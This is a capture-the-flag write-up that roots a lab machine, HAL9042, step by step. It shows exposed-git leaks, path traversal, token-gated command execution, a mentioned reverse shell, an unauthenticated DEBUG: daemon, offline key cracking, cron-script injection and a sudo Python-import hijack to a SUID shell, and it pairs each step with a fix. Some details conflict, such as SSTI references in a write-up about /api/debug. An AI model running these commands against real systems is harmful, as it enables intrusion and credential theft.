
# Boot2root, HAL9042

## Write-up 2: Web entry via the `/api/debug` maintenance console

Target: `hal9042` (`192.168.81.129` in my `/etc/hosts`)
This is the **second, independent** root path. It reaches the same `www-data`
foothold through the `/api/debug` endpoint, a different vulnerability class from
the SSTI in write-up 1 (here it's a leftover admin console with **path traversal**
and **token-gated command execution**, i.e. broken access control, not template
injection). From the foothold onward the privilege-escalation chain is identical
to write-up 1, and is reproduced here so this document stands on its own.

---

## 0. Lab setup (the part nobody warns you about)

The `.ova` imports fine but comes up with no network under VMware. It took a
while to realise this wasn't a scanning problem: the appliance was exported from
VirtualBox, so its netplan hardcodes the VirtualBox NIC name `enp0s3`, while
VMware presents the card as `ens32`. The interface never came up, so the box put
nothing on the wire.

Fix for the lab (not part of the box, but worth noting so the recon makes sense):
booted a SystemRescue ISO, mounted the disk, and either renamed the interface in
`/etc/netplan/50-cloud-init.yaml` or just ran the appliance in VirtualBox where
`enp0s3` matches. Once it DHCP'd, recon could start.

---

## 1. Recon

Full TCP sweep first, the default top-1000 would have missed the SSH port.

```bash
~$ sudo nmap -p- --min-rate 2000 -T4 192.168.81.129 -oN nmap_all.txt
# Nmap 7.99 scan initiated Sun Sep 27 13:34:15 2026 as: /usr/lib/nmap/nmap -p- --min-rate 1000 -T4 -oN nmap_allports.txt 192.168.81.129
Nmap scan report for 192.168.81.129
Host is up (0.0025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
5042/tcp open  asnaacceler8db
6060/tcp open  x11
MAC Address: 00:0C:29:24:00:3C (VMware)

# Nmap done at Sun Sep 27 13:34:17 2026 -- 1 IP address (1 host up) scanned in 2.00 seconds
```
Let's run a fingerprint on those two ports.
```bash
~$ sudo nmap -p 5042,6060 -sC -sV 192.168.81.129 -oN nmap_deep.txt
# Nmap 7.99 scan initiated Sun Sep 27 13:36:09 2026 as: /usr/lib/nmap/nmap -p 5042,6060 -sC -sV -O -oN nmap_deep.txt 192.168.81.129
Nmap scan report for 192.168.81.129
Host is up (0.00052s latency).

PORT     STATE SERVICE VERSION
5042/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-robots.txt: 10 disallowed entries 
| /api/debug /static/js/debug.js /api/internal/ /beta/ 
| /flag /flag.txt /admin /the_real_flag_is_in_here 
|_/definitely_not_a_trap /secret_backup_DO_NOT_READ
| http-git: 
|   192.168.81.129:5042/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     .git/COMMIT_EDITMSG matched patterns 'bug'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: remove debug config before launch 
|_http-title: HAL9042 \xE2\x80\x94 Evaluation Server
6060/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 24:28:b9:a5:9a:c8:c5:48:3a:f0:d1:7c:df:94:58:59 (ECDSA)
|_  256 05:44:58:ab:f2:e9:79:25:93:e4:13:3f:8f:df:a0:90 (ED25519)
MAC Address: 00:0C:29:24:00:3C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 27 13:36:22 2026 -- 1 IP address (1 host up) scanned in 13.75 seconds
```

Two ports:

- `5042/tcp`, nginx 1.24.0, the "HAL9042 Evaluation Server"
- `6060/tcp`, OpenSSH (note: **not** 22; remember this for later)

nmap's `http-git` and `http-robots.txt` scripts already paid off:

```
| http-robots.txt: 10 disallowed entries
|   /api/debug /static/js/debug.js /api/internal/ /beta/
|   /flag /flag.txt /admin /the_real_flag_is_in_here
|   /definitely_not_a_trap /secret_backup_DO_NOT_READ
| http-git:
|   192.168.81.129:5042/.git/
|   Last commit message: remove debug config before launch
```

Most of the `robots.txt` entries are bait. `/flag` for example just returns a
decoy:

```
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}   # DO NOT SUBMIT
```

The two entries that actually matter are `/static/js/debug.js` and the
**exposed `.git` directory**.

> **Flag, recon:** once a shell as `www-data` is obtained (below), the flag
> broker hands out the recon flag:
> ```bash
> FLAG{r3c0n_1s_k1ng}
> ```

**Fix:** don't expose `.git/` under the web root (it's the whole source tree).
Drop a `location ~ /\.git { deny all; }` in nginx, or better, deploy build
artifacts only. `robots.txt` is not an access control, anything listed there is
an invitation, so sensitive paths must be authenticated, not merely "hidden".

---

## 2. The `.git` leak, reading the source

We got a directory listing on `.git/`,  And I pulled it with `git-dumper`:

```bash
pipx install git-dumper
git-dumper http://192.168.81.129:5042/.git/ src
cd src && git log --oneline --all
```

The repo is the full Flask app. `config.py` holds the goodies:

```python
ADMIN_TOKEN = "..."          # maintenance token for /api/debug
SECRET_KEY  = "hal9042secret"
DB_PASS     = "Moulinette2024!"
```

And the commit **"remove debug config before launch"** deletes a
`DEBUG_NOTES.md`, but `git show` brings it back:

```
# Internal debug endpoints (REMOVE BEFORE LAUNCH)
- /api/debug?file=<path>          to read a file. path is joined onto the app dir, so ../ works.
- /api/debug?cmd=<sh>&token=<TOK> to run a maintenance command. TOK is ADMIN_TOKEN in config.py.
- The semi-blind SSTI on /evaluate becomes visible with the header
  X-Debug-Render: true   (see static/js/debug.js).
  -- paco
```

That single recovered file is the map for both write-ups. For this one, the line
that matters is the **SSTI on `/evaluate`** and the `X-Debug-Render` header.
`static/js/debug.js` confirms the engine:

```js
// Setting this request header switches /evaluate into verbose render mode,
// so the Jinja2-rendered output is returned instead of the opaque ack.
debug_header: "X-Debug-Render",
```

So: Jinja2, and a header that turns a blind bug into a visible one.

> **Flag for the git discovery step:**
> ```bash
> FLAG{g1t_n3v3r_f0rg3ts}
> ```

**Fix:** secrets never belong in source control. Rotate `ADMIN_TOKEN`,
`SECRET_KEY` and `DB_PASS` immediately (they're burned the moment they're
committed, even if "deleted" in a later commit, the history keeps them). Load
secrets from the environment or a vault, and scrub the git history
(`git filter-repo`) rather than assuming a delete-commit is enough.

---

## 3. `/api/debug` to file read + RCE as `www-data`

### 3a. Path traversal (arbitrary file read)

The `?file=` parameter joins onto the app directory and doesn't sanitise `../`, so
it reads anything the web user can:

```bash
curl -s "http://192.168.81.129:5042/api/debug?file=../../../../etc/passwd"
```

That enumerates the accounts (`paco`, `wil`, `sophie`, `ol`, and the daemon user
`www-data`). More usefully, it reads paco's leftover secrets directly, no shell
needed:

```bash
curl -s "http://192.168.81.129:5042/api/debug?file=../../../../home/paco/.bash_history"
curl -s "http://192.168.81.129:5042/api/debug?file=../../../../home/paco/.env.old"
```

```
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```

### 3b. Token-gated command execution

With `ADMIN_TOKEN` from `config.py`, the `?cmd=` primitive runs commands as the
web user:

```bash
TOK="<ADMIN_TOKEN from config.py>"
curl -s -G "http://192.168.81.129:5042/api/debug" \
  --data-urlencode "cmd=id" --data-urlencode "token=$TOK"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That's RCE as `www-data`. I turned it into a proper shell with a reverse shell
through the same parameter (listener `nc -lvnp 4444`, base64-encoded command to
avoid quoting issues), then stabilised the TTY with
`python3 -c 'import pty; pty.spawn("/bin/bash")'`.

> **Flag, `/api/debug` technique (web entry) + foothold:**
> ```bash
> nc -U /run/flagd/www.sock
> FLAG{r3c0n_1s_k1ng}
> FLAG{g1t_n3v3r_f0rg3ts}
> FLAG{s3m1_bl1nd_st1ll_burns}
> FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
> ```
> The `www_d4t4` flag is the `www-data` foothold proof reached via this endpoint;
> `s3m1_bl1nd` is the SSTI-technique flag (both are brokered on the www identity,
> the two distinct web techniques are documented across the two write-ups).

Why this counts as a genuinely different technique from write-up 1: the SSTI
path abuses a template engine evaluating user input; this path abuses an exposed
administrative endpoint, path traversal plus command execution gated by a
hard-coded token (broken access control + injection). Different root cause,
different fix.

**Fix:** remove debug/maintenance endpoints before shipping. Never gate
privileged actions behind a static token committed to source, use real,
rotatable authentication and authorization. For the file read, canonicalise and
confine paths to a fixed base directory and reject `..` (or serve from an
allow-list), never concatenate user input onto a path.

---

## 4. `www-data` to `paco` (credential reuse)

First thing on any new identity: look for creds and read that user's broker
socket.

```bash
~$ ls -la /home/paco
total 60
drwxr-xr-x 6 paco paco 4096 Oct  3 20:40 .
drwxr-xr-x 9 root root 4096 Jun  6 12:29 ..
-rw-r--r-- 1 paco paco 3593 Oct  6 14:06 .bash_history
-rw-r--r-- 1 paco paco  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 paco paco 3771 Mar 31  2024 .bashrc
drwx------ 2 paco paco 4096 Sep 30 15:31 .cache
-rw-r--r-- 1 paco paco  188 Jun  6 12:30 .env.old
-rw------- 1 paco paco   34 Oct  3 20:40 .lesshst
drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 notes
-rw-r--r-- 1 paco paco  807 Mar 31  2024 .profile
drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 scripts
drwxr-xr-x 2 paco paco 4096 Oct  3 20:37 src
-rw-r--r-- 1 paco paco  461 Jun  6 12:30 TODO.md
-rw------- 1 paco paco 4159 Oct  3 20:37 .viminfo
```

```bash
~$ cat /home/paco/.env.old
# old deploy env, paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```

An old environment file left in the home directory, world-readable, with paco's
SSH password in cleartext. SSH is on 6060:

```bash
ssh -p 6060 paco@192.168.81.129      # Pac0_H4L_dev!
```

```bash
paco@hal9042:~$ nc -U /run/flagd/paco.sock
FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
```

Paco's `.bash_history` and `TODO.md` are worth reading, they confirm the eval
daemon, name `sophie` and `ol`, and point at `scripts/encrypt.py` (all used
later).

**Fix:** don't leave old `.env` files on disk, and never store passwords in
cleartext. Rotate `Pac0_H4L_dev!`. The deeper issue is **credential reuse**, the
same password gates a config value and a shell account; each secret should be
unique and scoped.

---

## 5. `paco` to `wil` (debug command handler on 127.0.0.1:7042)

Paco's history shows an internal service:

```
gcc -O2 -o /opt/hal9042/daemon evaluator.c
echo "DEBUG:id" | nc 127.0.0.1 7042
systemctl --user status hal9042d
```

`hal9042d` listens on `127.0.0.1:7042` and runs as **wil**. The source
(`/home/paco/src/evaluator.c`) is the whole vulnerability:

```c
if (strncmp(buf, DEBUG_PREFIX, strlen(DEBUG_PREFIX)) == 0) {   // "DEBUG:", no auth
    const char *cmd = buf + strlen(DEBUG_PREFIX);
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);   // wire the socket to the child's stdio
    system(cmd);                             // runs as wil
}
```

Anything after `DEBUG:` is handed to `system()` as wil, with no authentication,
and the socket is wired to the command's stdio so you get an interactive shell
for free.

```bash
paco@hal9042:~$ echo "DEBUG:id" | nc 127.0.0.1 7042
uid=1002(wil) gid=1002(wil) groups=1002(wil),1001(evalops)
```

I dropped my key into wil's `authorized_keys` through it (stable beats a raw
socket), then read wil's flag:

```bash
echo 'DEBUG:mkdir -p /home/wil/.ssh && echo "<my pubkey>" >> /home/wil/.ssh/authorized_keys' | nc 127.0.0.1 7042
ssh -p 6060 wil@127.0.0.1
wil@hal9042:~$ nc -U /run/flagd/wil.sock
FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
```

Note wil's groups: `evalops`. That's the key to the next hop.

**Fix:** remove debug/maintenance command handlers before production. If an IPC
service is genuinely needed, authenticate it and never pass received bytes to
`system()`/`popen()`. Binding to `127.0.0.1` is not protection once any local
foothold exists. Run it under a dedicated, minimally-privileged account.

---

## 6. `wil` to `sophie` (offline-cracked SSH key)

Wil kept a copy of sophie's SSH key, encrypted:

```bash
wil@hal9042:~$ ls .ssh
id_rsa_sophie.enc
```

Wil's own note spells out the passphrase strength:

> "I kept a copy of sophie's old access key, encrypted ... the passphrase is the
> most common password in the world. She used to laugh at people for it."

Online brute force is forbidden by the subject, but **offline** cracking of
captured material is fair game and is exactly what's intended:

```bash
# on my box
ssh2john id_rsa_sophie.enc > sophie.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sophie.hash
# passphrase: iloveyou
```

```bash
chmod 600 id_rsa_sophie.enc
ssh -p 6060 -i id_rsa_sophie.enc sophie@192.168.81.129   # passphrase: iloveyou
sophie@hal9042:~$ nc -U /run/flagd/sophie.sock
FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
```

**Fix:** never store another user's private key, If a key must be
protected by a passphrase, that passphrase has to be strong and unique, a
top-100 rockyou entry gives zero protection. 

---

## 7. `sophie` to `ol` (group-writable cron script)

Sophie can't `sudo` (it asks for a password I don't have, and credential reuse
didn't work, a deliberate dead end). The real lead is in `ol`'s home:

```bash
ls -la /home/ol/scripts/
-rwxrwxr-x 1 ol evalops 380 ... check.sh
```

`check.sh` is group-writable by **evalops**, and it runs from ol's crontab every
5 minutes as ol. Sophie is *not* in `evalops`, but **wil is**
(`grep evalops /etc/group` to `evalops:x:1001:wil`). The systemd unit even
documents the intended path:

```
# Explicit so a wil shell obtained via DEBUG: can write ol's check.sh
```

So this hop is actually driven from the wil shell. Append a payload (keep the
original heartbeat lines intact) that runs as ol on the next tick:

```bash
# as wil
cat >> /home/ol/scripts/check.sh <<'EOF'
cp /home/ol/.config/.key_part /tmp/.olpart 2>/dev/null; chmod 644 /tmp/.olpart
nc -U /run/flagd/ol.sock > /tmp/.olflag 2>/dev/null; chmod 644 /tmp/.olflag
mkdir -p /home/ol/.ssh && echo "<my pubkey>" >> /home/ol/.ssh/authorized_keys
EOF
```

Wait ~5 minutes, then:

```bash
cat /tmp/.olflag
FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
ssh -p 6060 ol@127.0.0.1
```

(The `nc -U` line matters: `flagd` checks the peer's uid via `SO_PEERCRED`, so
ol's flag can only be read by a process actually running as ol, the cron job is
exactly that.)

**Fix:** scripts executed by cron must not be writable by other users. `check.sh`
should be `root:root` or `ol:ol` with `750`, never group-writable by a group that
contains a different, lower-trust user. Group design shouldn't let one account
write another account's scheduled jobs.

---

## 8. Reassembling the sealed report (chain flag)

`/home/paco/scripts/encrypt.py` describes a four-party key split sealing
`/home/ol/rapport/rapport_final.enc`:

```
key  = sha256( part1 + part2 + part3 + part4 )
part1 ol     ~/.config/.key_part
part2 wil    ~/data/.key_part
part3 sophie ~/drafts/.key_part
part4 xavier /tmp/.xn/.key_part
cipher = AES-256-ECB
```

The whole point ("no single person can decrypt it alone") collapses once you've
walked the chain: wil's part is a plain file, sophie's is in her home, xavier's
sits in world-readable `/tmp`, and ol's I grabbed through the cron job in the
previous step. Concatenate in order, sha256, decrypt:

```bash
P1=$(cat /tmp/.olpart); P2=$(cat /home/wil/data/.key_part)
P3=$(cat /home/sophie/drafts/.key_part); P4=$(cat /tmp/.xn/.key_part)
KEY=$(printf '%s%s%s%s' "$P1" "$P2" "$P3" "$P4" | sha256sum | cut -d' ' -f1)
openssl enc -d -aes-256-ecb -K "$KEY" \
  -in /home/ol/rapport/rapport_final.enc -out /tmp/rapport.txt
```

(If you hit `bad decrypt`: make sure all four `P` vars are set in the *same*
shell and the order is `ol, wil, sophie, xavier`, a wrong key fails at the
padding check.)

The report contains the chain flag and the story (and points at xavier/uid 1337):

```
FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
```

**Fix:** don't roll your own secret sharing. and always make sure the shares aren't all reachable from a single
compromised mid-chain account.

---

## 9. `ol` to `root` (sudo + writable Python module)

```bash
ol@hal9042:~$ sudo -l
User ol may run the following commands on hal9042:
    (root) NOPASSWD: /opt/hal9042/scripts/report.py
```

The script is root-owned (can't edit it), but look at what it imports:

```python
sys.path.insert(0, "/opt/hal9042/lib")   # prepended to the path
import moulai_utils                        # loaded from there, AS ROOT
```

And the lib directory is group-writable by `hal9042`, which ol belongs to:

```bash
ol@hal9042:~$ ls -la /opt/hal9042/lib/
drwxrwxr-x 2 root hal9042 ... .
-rw-rw-r-- 1 root hal9042 ... moulai_utils.py
```

So I can make `report.py` run my code as root by editing the module it imports.
Back up the original, append a payload that drops a SUID root shell (keep
`count_today()` so the script still finishes), run the sudo'd script, then use
the SUID bash:

```bash
cp /opt/hal9042/lib/moulai_utils.py /tmp/moulai_utils.py.bak
cat >> /opt/hal9042/lib/moulai_utils.py <<'EOF'

import os as _os
_os.system("cp /bin/bash /tmp/.rootbash && chmod 4755 /tmp/.rootbash")
EOF

sudo /opt/hal9042/scripts/report.py
/tmp/.rootbash -p
# id to uid=1004(ol) ... euid=0(root)
```

Root.

**Fix:** never give `sudo` (especially `NOPASSWD`) to a script that loads code
from a writable location. `sys.path.insert(0, ...)` pointing at a group-writable
dir is arbitrary code execution as root by design. The lib directory must be
`root:root` and not group/world-writable; pin the import path; and avoid
NOPASSWD on anything whose behaviour a lower-privileged user can influence.

---

## 10. Root loot

The board's PDF that sophie sealed is in `/root`. Her `.bash_history` gave the
password when I was sophie:

```
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
sudo mv PROJET_FORK_HAL9042.pdf /root/
```

`qpdf` isn't installed on the box, so I copied the file out to ol's home, pulled
it to my machine with `scp`, and opened it there (password `Pr0j3tF0rk_J14`):

```bash
# on the box, as root:
cp /root/PROJET_FORK_HAL9042.pdf /home/ol/ && chmod 644 /home/ol/PROJET_FORK_HAL9042.pdf
# on my box:
scp -P 6060 -i id_rsa_sophie sophie@192.168.81.129:/home/ol/PROJET_FORK_HAL9042.pdf .
pdftotext -upw 'Pr0j3tF0rk_J14' PROJET_FORK_HAL9042.pdf - | grep FLAG
FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
```

**Fix:** a document password that's written in the author's shell history (and
reused as an account password elsewhere) is no protection. Don't store the key
next to the lock, don't reuse it, and clear shell history for anything sensitive
(`HISTCONTROL`, or just don't type secrets on the command line).

---

## Flag inventory

| # | Flag | Where / how | Bucket |
|---|------|-------------|--------|
| 1 | `FLAG{r3c0n_1s_k1ng}` | full port scan; www.sock | chain |
| 2 | `FLAG{g1t_n3v3r_f0rg3ts}` | exposed `.git` / config.py; www.sock | chain |
| 3 | `FLAG{s3m1_bl1nd_st1ll_burns}` | SSTI on `/evaluate`; www.sock | **web #1** |
| 4 | `FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}` | SSTI RCE as www-data; www.sock | **web #2 proof** |
| 5 | `FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}` | `.env.old` to paco; paco.sock | chain |
| 6 | `FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}` | `DEBUG:` on 7042 to wil; wil.sock | chain |
| 7 | `FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}` | cracked key to sophie; sophie.sock | chain |
| 8 | `FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}` | group-writable cron to ol; ol.sock | chain |
| 9 | `FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}` | decrypted `rapport_final.enc` | chain |
| 10 | `FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}` | `/root` PDF | chain (root) |

## Path summary

`unauth to www-data` (`/api/debug` path traversal + token-gated command exec) `to
paco` (reused password in `.env.old`) `to wil` (DEBUG backdoor on 7042) `to sophie`
(cracked SSH key) `to ol` (group-writable cron) `to root` (sudo + writable Python
import).